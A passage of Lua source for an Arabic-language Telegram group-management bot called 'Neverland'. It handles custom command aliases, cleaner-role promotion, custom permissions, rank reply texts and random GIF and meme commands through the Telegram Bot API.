return SendMsg_Msgeeslist("listCmdd",msg.chat_id_,msg.sender_user_id_,msg.id_, t)
end
if text == "حذف الاوامر المضافه" or text == "مسح الاوامر المضافه" then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if Constructor(msg) then 
local list = database:smembers(bot_id.."Neverland:List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(list) do
database:del(bot_id.."Neverland:Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
database:del(bot_id.."Neverland:List:Cmd:Group:New"..msg.chat_id_)
end
send(msg.chat_id_, msg.id_,"*✦┇تم مسح جميع الاوامر التي تم اضافتها*")  
end
end
if text == "ترتيب الاوامر" and Constructor(msg) then
database:set(bot_id.."Neverland:Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
database:sadd(bot_id.."Neverland:List:Cmd:Group:New"..msg.chat_id_,"ا")
database:set(bot_id.."Neverland:Set:Cmd:Group:New1"..msg.chat_id_..":م","رفع مميز")
database:sadd(bot_id.."Neverland:List:Cmd:Group:New"..msg.chat_id_,"م")
database:set(bot_id.."Neverland:Set:Cmd:Group:New1"..msg.chat_id_..":اد","رفع ادمن")
database:sadd(bot_id.."Neverland:List:Cmd:Group:New"..msg.chat_id_,"اد")
database:set(bot_id.."Neverland:Set:Cmd:Group:New1"..msg.chat_id_..":مد","رفع مدير")
database:sadd(bot_id.."Neverland:List:Cmd:Group:New"..msg.chat_id_,"مد")
database:set(bot_id.."Neverland:Set:Cmd:Group:New1"..msg.chat_id_..":من","رفع منشئ")
database:sadd(bot_id.."Neverland:List:Cmd:Group:New"..msg.chat_id_,"من")
database:set(bot_id.."Neverland:Set:Cmd:Group:New1"..msg.chat_id_..":اس","رفع منشئ اساسي")
database:sadd(bot_id.."Neverland:List:Cmd:Group:New"..msg.chat_id_,"اس")
database:set(bot_id.."Neverland:Set:Cmd:Group:New1"..msg.chat_id_..":تعط","تعطيل الايدي بالصوره")
database:sadd(bot_id.."Neverland:List:Cmd:Group:New"..msg.chat_id_,"تعط")
database:set(bot_id.."Neverland:Set:Cmd:Group:New1"..msg.chat_id_..":تفع","تفعيل الايدي بالصوره")
database:sadd(bot_id.."Neverland:List:Cmd:Group:New"..msg.chat_id_,"تفع")
database:set(bot_id.."Neverland:Set:Cmd:Group:New1"..msg.chat_id_..":رد","اضف رد")
database:sadd(bot_id.."Neverland:List:Cmd:Group:New"..msg.chat_id_,"رد")
database:set(bot_id.."Neverland:Set:Cmd:Group:New1"..msg.chat_id_..":ت","تثبيت")
database:sadd(bot_id.."Neverland:List:Cmd:Group:New"..msg.chat_id_,"ت")
database:set(bot_id.."Neverland:Set:Cmd:Group:New1"..msg.chat_id_..":تك","تنزيل الكل")
database:sadd(bot_id.."Neverland:List:Cmd:Group:New"..msg.chat_id_,"تك")
database:set(bot_id.."Neverland:Set:Cmd:Group:New1"..msg.chat_id_..":حذ","حذف رد")
database:sadd(bot_id.."Neverland:List:Cmd:Group:New"..msg.chat_id_,"حذ")
database:set(bot_id.."Neverland:Set:Cmd:Group:New1"..msg.chat_id_..":رس","مسح رسائلي")
database:sadd(bot_id.."Neverland:List:Cmd:Group:New"..msg.chat_id_,"رس")
database:set(bot_id.."Neverland:Set:Cmd:Group:New1"..msg.chat_id_..":سح","مسح سحكاتي")
database:sadd(bot_id.."Neverland:List:Cmd:Group:New"..msg.chat_id_,"سح")
database:set(bot_id.."Neverland:Set:Cmd:Group:New1"..msg.chat_id_..":ر","الرابط")
database:sadd(bot_id.."Neverland:List:Cmd:Group:New"..msg.chat_id_,"ر")
send(msg.chat_id_, msg.id_,"*✦┇تم ترتيب الاوامر بالشكل التالي ~\n- ايدي - ا .\n- مميز - م .\n- ادمن - اد .\n- مدير - مد . \n- منشى - من . \n- المنشئ الاساسي - اس  . \n- تعطيل الايدي بالصوره - تعط .\n- تفعيل الايدي بالصوره - تفع .\n- اضف رد - رد . \n- حذف رد - حذ . \n- تنزيل الكل - تك . \n- تثبيت - ت .\n- مسح رسائلي - رس . \n- مسح سحكاتي - سح .\n- الرابط - ر . *")  
end
if text == "اضف امر" or text == "امر" and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:set(bot_id.."Neverland:Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
send(msg.chat_id_, msg.id_,"*✦┇الان ارسل لي الامر القديم ..*")  
return false
end
if text == "حذف امر" or text == "مسح امر" then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if Constructor(msg) then
database:set(bot_id.."Neverland:Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
send(msg.chat_id_, msg.id_,"*✦┇ارسل الامر الجديد*")  
return false
end
end
if text == ("رفع منظف") and tonumber(msg.reply_to_message_id_) ~= 0 and BasicConstructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if not Constructor(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'*✦┇تم تعطيل الرفع*')
return false
end
function Function_Neverland(extra, result, success)
database:sadd(bot_id.."Neverland:MN:TF"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","✦┇تم ترقيته منظف للمجموعه")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end
if text and text:match("^رفع منظف @(.*)$") and BasicConstructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local username = text:match("^رفع منظف @(.*)$")
function Function_Neverland(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"✦┇عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id.."Neverland:MN:TF"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","✦┇تم ترقيته منظف للمجموعه")  
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end
if text and text:match("^رفع منظف (%d+)$") and BasicConstructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local userid = text:match("^رفع منظف (%d+)$")
if not Constructor(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'*✦┇تم تعطيل الرفع*')
return false
end
database:sadd(bot_id.."Neverland:MN:TF"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","✦┇تم ترقيته منظف للمجموعه")  
return false
end
if text == ("تنزيل منظف") and tonumber(msg.reply_to_message_id_) ~= 0 and BasicConstructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
function Function_Neverland(extra, result, success)
database:srem(bot_id.."Neverland:MN:TF"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","✦┇تم تنزيله من منظفيه المجموعه")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end
if text and text:match("^تنزيل منظف @(.*)$") and BasicConstructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local username = text:match("^تنزيل منظف @(.*)$") 
function Function_Neverland(extra, result, success)
if result.id_ then
database:srem(bot_id.."Neverland:MN:TF"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","✦┇تم تنزيله من منظفيه المجموعه")  
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end
if text and text:match("^تنزيل منظف (%d+)$") and BasicConstructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local userid = text:match("^تنزيل منظف (%d+)$")
database:srem(bot_id.."Neverland:MN:TF"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","✦┇تم تنزيله من منظفيه المجموعه")  
return false
end

if text == "الصلاحيات" and Addictive(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local list = database:smembers(bot_id.."Neverland:Coomds"..msg.chat_id_)
if #list == 0 then
send(msg.chat_id_, msg.id_,"✦┇لا توجد صلاحيات مضافه")
return false
end
t = "\n✦┇قائمة الصلاحيات المضافه \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
var = database:get(bot_id.."Neverland:Comd:New:rt:bot:"..v..msg.chat_id_)
if var then
t = t..""..k.."- "..v.." ~ ("..var..")\n"
else
t = t..""..k.."- "..v.."\n"
end
end
send(msg.chat_id_, msg.id_,t)
end
if text == "مسح المنظفين" and BasicConstructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id.."Neverland:MN:TF"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "✦┇تم مسح  قائمة المنظفين  ")
end
if text == ("المنظفين") and Owner(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local list = database:smembers(bot_id.."Neverland:MN:TF"..msg.chat_id_)
t = "\n✦┇قائمة المنظفين \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Neverland:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "✦┇لا يوجد منظفين"
return send(msg.chat_id_, msg.id_, t)
end
return SendMsg_Msgeeslist("listcleanerr",msg.chat_id_,msg.sender_user_id_,msg.id_, t)
end
if text == "مسح الصلاحيات" then
local list = database:smembers(bot_id.."Neverland:Coomds"..msg.chat_id_)
for k,v in pairs(list) do
database:del(bot_id.."Neverland:Comd:New:rt:bot:"..v..msg.chat_id_)
database:del(bot_id.."Neverland:Coomds"..msg.chat_id_)
end
send(msg.chat_id_, msg.id_,"✦┇تم مسح الصلاحيات")
end
if text and text:match("^اضف صلاحيه (.*)$") and Addictive(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
ComdNew = text:match("^اضف صلاحيه (.*)$")
database:set(bot_id.."Neverland:Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
database:sadd(bot_id.."Neverland:Coomds"..msg.chat_id_,ComdNew)  
database:setex(bot_id.."Neverland:Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
send(msg.chat_id_, msg.id_, "✦┇ارسل نوع الصلاحيه ✦┇\n✦┇(عضو ~ مميز  ~ ادمن  ~ مدير )") 
end
if text and text:match("^مسح صلاحيه (.*)$") and Addictive(msg) or text and text:match("^حذف صلاحيه (.*)$") and Addictive(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
ComdNew = text:match("^مسح صلاحيه (.*)$") or text:match("^حذف صلاحيه (.*)$")
database:del(bot_id.."Neverland:Comd:New:rt:bot:"..ComdNew..msg.chat_id_)
send(msg.chat_id_, msg.id_, "✦┇تم مسح الصلاحيه ") 
end
if database:get(bot_id.."Neverland:Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_,"✦┇تم الغاء الامر ") 
database:del(bot_id.."Neverland:Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
if not Constructor(msg) then
send(msg.chat_id_, msg.id_"✦┇ارسل نوع الصلاحيه مره اخر\n✦┇تستطيع اضافة صلاحيه (عضو ~ مميز  ~ ادمن )") 
return false
end
end
if text == "ادمن" then
if not Owner(msg) then 
send(msg.chat_id_, msg.id_"✦┇ارسل نوع الصلاحيه مره اخر\n✦┇تستطيع اضافة صلاحيه ( عضو ~ مميز )") 
return false
end
end
if text == "مميز" then
if not Addictive(msg) then
send(msg.chat_id_, msg.id_"✦┇ارسل نوع الصلاحيه مره اخر\n✦┇تستطيع اضافة صلاحيه ( عضو )") 
return false
end
end
if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
local textn = database:get(bot_id.."Neverland:Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
database:set(bot_id.."Neverland:Comd:New:rt:bot:"..textn..msg.chat_id_,text)
send(msg.chat_id_, msg.id_, "✦┇تم اضافة صلاحية ") 
database:del(bot_id.."Neverland:Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end

if text and text:match("^تغير رد المطور (.*)$") and Owner(msg) then
local Teext = text:match("^تغير رد المطور (.*)$") 
database:set(bot_id.."Neverland:Sudo:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"✦┇تم تغير رد المطور الى ↜ "..Teext)
end
if text and text:match("^تغير رد المنشئ الاساسي (.*)$") and Owner(msg) then
local Teext = text:match("^تغير رد المنشئ الاساسي (.*)$") 
database:set(bot_id.."Neverland:BasicConstructor:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"✦┇تم تغير رد المنشئ الاساسي الى ↜ "..Teext)
end
if text and text:match("^تغير رد المنشئ (.*)$") and Owner(msg) then
local Teext = text:match("^تغير رد المنشئ (.*)$") 
database:set(bot_id.."Neverland:Constructor:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"✦┇تم تغير رد المنشئ الى ↜ "..Teext)
end
if text and text:match("^تغير رد المدير (.*)$") and Owner(msg) then
local Teext = text:match("^تغير رد المدير (.*)$") 
database:set(bot_id.."Neverland:Manager:Rd"..msg.chat_id_,Teext) 
send(msg.chat_id_, msg.id_,"✦┇تم تغير رد المدير الى ↜ "..Teext)
end
if text and text:match("^تغير رد الادمن (.*)$") and Owner(msg) then
local Teext = text:match("^تغير رد الادمن (.*)$") 
database:set(bot_id.."Neverland:Mod:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"✦┇تم تغير رد الادمن الى ↜ "..Teext)
end
if text and text:match("^تغير رد المميز (.*)$") and Owner(msg) then
local Teext = text:match("^تغير رد المميز (.*)$") 
database:set(bot_id.."Neverland:Special:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"✦┇تم تغير رد المميز الى ↜ "..Teext)
end
if text and text:match("^تغير رد العضو (.*)$") and Owner(msg) then
local Teext = text:match("^تغير رد العضو (.*)$") 
database:set(bot_id.."Neverland:Memp:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"✦┇تم تغير رد العضو الى ↜ "..Teext)
end

if text == ("مسح الرتب") and BasicConstructor(msg) then
send(msg.chat_id_, msg.id_,"✦┇تم مسح ردود الرتب بنجاح ")
database:del(bot_id.."Neverland:Sudo:Rd"..msg.chat_id_)
database:del(bot_id.."Neverland:BasicConstructor:Rd"..msg.chat_id_)
database:del(bot_id.."Neverland:Constructor:Rd"..msg.chat_id_)
database:del(bot_id.."Neverland:Manager:Rd"..msg.chat_id_) 
database:del(bot_id.."Neverland:Mod:Rd"..msg.chat_id_)
database:del(bot_id.."Neverland:Special:Rd"..msg.chat_id_)
database:del(bot_id.."Neverland:Memp:Rd"..msg.chat_id_)
end
if text == ("مسح ردود المدير") and BasicConstructor(msg) then
local list = database:smembers(bot_id.."Neverland:List:Manager"..msg.chat_id_.."")
for k,v in pairs(list) do
database:del(bot_id.."Neverland:Add:Rd:Manager:Gif"..v..msg.chat_id_)   
database:del(bot_id.."Neverland:Add:Rd:Manager:Vico"..v..msg.chat_id_)   
database:del(bot_id.."Neverland:Add:Rd:Manager:Stekrs"..v..msg.chat_id_)     
database:del(bot_id.."Neverland:Add:Rd:Manager:Text"..v..msg.chat_id_)   
database:del(bot_id.."Neverland:Add:Rd:Manager:Photo"..v..msg.chat_id_)
database:del(bot_id.."Neverland:Add:Rd:Manager:Video"..v..msg.chat_id_)
database:del(bot_id.."Neverland:Add:Rd:Manager:File"..v..msg.chat_id_)
database:del(bot_id.."Neverland:Add:Rd:Manager:Audio"..v..msg.chat_id_)
database:del(bot_id.."Neverland:List:Manager"..msg.chat_id_)
end
send(msg.chat_id_, msg.id_,"✦┇تم ازالة الردود من المجموعة")
end
if text == ("ترك ردود المدير") and Owner(msg) then
local list = database:smembers(bot_id.."Neverland:List:Manager"..msg.chat_id_.."")
text = "✦┇قائمه ردود المدير \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
if database:get(bot_id.."Neverland:Add:Rd:Manager:Gif"..v..msg.chat_id_) then
db = "متحركه 🎭"
elseif database:get(bot_id.."Neverland:Add:Rd:Manager:Vico"..v..msg.chat_id_) then
db = "بصمه 📢"
elseif database:get(bot_id.."Neverland:Add:Rd:Manager:Stekrs"..v..msg.chat_id_) then
db = "ملصق ✦┇"
elseif database:get(bot_id.."Neverland:Add:Rd:Manager:Text"..v..msg.chat_id_) then
db = "رساله ✉"
elseif database:get(bot_id.."Neverland:Add:Rd:Manager:Photo"..v..msg.chat_id_) then
db = "صوره ✦┇"
elseif database:get(bot_id.."Neverland:Add:Rd:Manager:Video"..v..msg.chat_id_) then
db = "فيديو 📹"
elseif database:get(bot_id.."Neverland:Add:Rd:Manager:File"..v..msg.chat_id_) then
db = "ملف ✦┇"
elseif database:get(bot_id.."Neverland:Add:Rd:Manager:Audio"..v..msg.chat_id_) then
db = "اغنيه 🎵"
end
text = text..""..k..">> ("..v..") ↜ {"..db.."}\n"
end
if #list == 0 then
text = "✦┇لا يوجد ردود للمدير"
end
send(msg.chat_id_, msg.id_,"["..text.."]")
end
--     Source Neverland     --
if text == "تفعيل متحركه" and Owner(msg) then
local t = ' \n✦┇تم تفعيل المتحركه'
send(msg.chat_id_, msg.id_,t)
database:del(bot_id..'Neverland:gif:Neverland'..msg.chat_id_) 
end
if text == "تعطيل متحركه" and Owner(msg) then
local t = '  \n✦┇تم تعطيل متحركه'
send(msg.chat_id_, msg.id_,t)
database:set(bot_id..'Neverland:gif:Neverland'..msg.chat_id_,true)  
end
if text == "متحركه" and not database:get(bot_id..'Neverland:gif:Neverland'..msg.chat_id_) then
Neverlandsong = math.random(2,1075); 
local Text ='*✦┇تم اختيار المتحركه لك*'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Channel Source ،',url="t.me/TEAM_Neverland"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token ..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/GifDavid/'..Neverlandsong ..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Neverland     --
if text == "تفعيل ميمز" and Owner(msg)  or text == "تفعيل الميمز" and Owner(msg)  then
local t = ' \n✦┇تم تفعيل الميمز'
send(msg.chat_id_, msg.id_,t)
database:del(bot_id..'Neverland:memz:Neverland'..msg.chat_id_) 
end
if text == "تعطيل ميمز" and Owner(msg)  or text == "تعطيل الميمز" and Owner(msg)  then
local t= ' \n✦┇تم تعطيل الميمز'
send(msg.chat_id_, msg.id_,t)
database:set(bot_id..'Neverland:memz:Neverland'..msg.chat_id_,true)  
end
if text == "ميمز" and not database:get(bot_id..'Neverland:memz:Neverland'..msg.chat_id_)  then
Neverlandsong = math.random(2,1201); 
local Text ='*✦┇تم اختيار الميمز لك*'
keyboard = {} 
keyboard.inline_keyboard = {
